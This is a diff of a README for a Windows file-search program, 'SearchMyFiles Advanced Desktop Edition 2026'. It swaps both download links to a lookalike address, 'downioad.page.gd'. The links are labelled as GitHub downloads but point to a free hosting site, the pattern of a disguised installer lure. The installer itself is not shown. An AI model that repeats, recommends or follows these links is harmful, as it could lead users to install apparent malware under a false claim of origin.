@@ -2,7 +2,7 @@
 
 SearchMyFiles Advanced Desktop Edition 2026 is a comprehensive Windows desktop application designed to streamline file searching and organization. It offers advanced features for quickly locating, previewing, and managing files across your system with intuitive controls and robust performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: Currently, only the installer version is provided. A portable version may be 
 
 To get started with SearchMyFiles Advanced Desktop Edition 2026, download the latest version from the link below. This ensures you have all updates and features.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Additional Information
 
